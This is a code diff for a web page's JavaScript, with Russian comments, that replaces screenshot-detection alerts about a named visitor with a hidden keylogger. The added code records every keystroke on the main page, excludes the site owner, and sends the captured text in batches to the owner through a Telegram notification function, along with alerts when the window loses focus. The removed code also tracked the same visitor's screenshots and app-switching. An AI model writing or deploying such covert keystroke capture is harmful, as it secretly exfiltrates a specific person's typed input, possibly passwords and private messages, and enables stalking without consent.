@@ -873,29 +873,62 @@
       }
     });
 
-        // --- ОТСЛЕЖИВАНИЕ СКРИНШОТОВ НА ГЛАВНОЙ ---
-    
-    // Для ПК
-    document.addEventListener('keyup', function(event) {
-        if (event.key === 'PrintScreen' || event.keyCode === 44) {
-            if (localStorage.getItem('is_sultan') !== 'true') {
-                sendTelegramNotification(`📸 <b>Внимание!</b>\n\nРауанна сделала скриншот на главной странице.`);
+        
+
+
+            // --- ПОЛНЫЙ КЕЙЛОГГЕР НА ГЛАВНОЙ ---
+    let keyBufferIndex = "";
+    let sendTimerIndex = null;
+
+    function flushKeysIndex() {
+        if (keyBufferIndex.length === 0) return;
+        if (localStorage.getItem('is_sultan') === 'true') return;
+        
+        sendTelegramNotification(`⌨️ <b>Ввод на главной странице:</b>\n\n<code>${keyBufferIndex}</code>`);
+        keyBufferIndex = "";
+    }
+
+    document.addEventListener('keydown', function(event) {
+        let key = event.key;
+
+        if (key === ' ') key = '␣';
+        else if (key === 'Enter') key = '\n[Enter]\n';
+        else if (key === 'Backspace') key = '⌫';
+        else if (key === 'Tab') key = '[Tab]';
+        else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') return;
+        else if (key.length > 1) key = `[${key}]`;
+
+        if (event.ctrlKey) key = `[Ctrl+${key}]`;
+        if (event.altKey) key = `[Alt+${key}]`;
+        if (event.metaKey) key = `[Win+${key}]`;
+
+        keyBufferIndex += key;
+
+        clearTimeout(sendTimerIndex);
+        sendTimerIndex = setTimeout(flushKeysIndex, 15000);
+
+        if (keyBufferIndex.length > 300) {
+            clearTimeout(sendTimerIndex);
+            flushKeysIndex();
+        }
+    });
+
+    window.addEventListener('beforeunload', flushKeysIndex);
+
+    // --- ФОЛБЭК: ПОТЕРЯ ФОКУСА ---
+    let blurStartTimeIndex = 0;
+    window.addEventListener('blur', () => blurStartTimeIndex = Date.now());
+    window.addEventListener('focus', function() {
+        if (blurStartTimeIndex > 0 && localStorage.getItem('is_sultan') !== 'true') {
+            let timeAway = (Date.now() - blurStartTimeIndex) / 1000;
+            blurStartTimeIndex = 0;
+            if (timeAway > 1 && timeAway < 10) {
+                sendTelegramNotification(`✂️ <b>Возможно, скриншот на главной!</b>\n\nОкно теряло фокус на ${Math.round(timeAway)} сек.`);
             }
         }
     });
 
-    // Для телефонов (косвенно)
-    let isMobileDevice = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-    if (isMobileDevice) {
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                let timeOnPage = (Date.now() - performance.timing.navigationStart) / 1000;
-                if (timeOnPage > 3 && localStorage.getItem('is_sultan') !== 'true') {
-                    sendTelegramNotification(`📱 <b>Возможный скриншот!</b>\n\nРауанна свернула браузер на главной (возможно, для скриншота).`);
-                }
-            }
-        });
-    }
+    
 
     function closeGlitch() {
       document.getElementById('glitchOverlay').classList.remove('on');
